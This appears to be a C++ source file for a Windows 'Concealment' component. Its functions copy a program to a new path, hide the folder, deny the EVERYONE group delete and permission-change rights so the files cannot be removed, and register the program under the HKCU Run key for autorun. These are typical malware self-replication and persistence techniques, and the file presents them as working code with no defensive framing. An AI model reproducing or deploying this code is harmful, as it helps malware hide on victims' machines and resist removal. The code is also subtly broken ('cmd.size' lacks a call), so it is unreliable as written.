#include "Concealment.h"

bool Concealment::Replicate(std::wstring fileName, std::wstring newFileName)
{
	std::wstring dir = newFileName.substr(0, newFileName.find_last_of(L"/"));
	SHCreateDirectory(NULL, dir.c_str());
	return CopyFileW(fileName.c_str(), newFileName.c_str(), FALSE);
}

bool Concealment::HideFolder(std::wstring path)
{
	return SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
}

bool RemoveDeletePermission(std::wstring path)
{
	PSECURITY_DESCRIPTOR pSD = NULL;
	PACL pDacl = NULL, pNewDacl = NULL;
	DWORD dwRes = 1;

	if (!GetNamedSecurityInfoW(path.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pDacl, NULL, &pSD))
	{
		EXPLICIT_ACCESSW ea;
		ZeroMemory(&ea, sizeof(EXPLICIT_ACCESSW));
		std::wstring trustee(L"EVERYONE");
		BuildExplicitAccessWithNameW(&ea, &trustee[0], DELETE | WRITE_DAC | WRITE_OWNER, DENY_ACCESS, SUB_CONTAINERS_AND_OBJECTS_INHERIT);

		if (!SetEntriesInAclW(1, &ea, pDacl, &pNewDacl))
		{
			dwRes = SetNamedSecurityInfoW(&path[0], SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL);
			LocalFree(pNewDacl);
		}
	}
	LocalFree(pSD);
	return !dwRes;
}

bool Concealment::AddToAutorun(std::wstring path, std::wstring name, std::vector<std::wstring> args)
{
	std::wstring cmd = path + L' ';
	for (std::wstring arg : args)
	{
		cmd += arg + L' ';
	}

	HKEY hKey;
	if (!RegCreateKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey))
	{
		return !RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (BYTE *)cmd.c_str(), (cmd.size + 1) * sizeof(wchar_t));
	}
	return false;
}
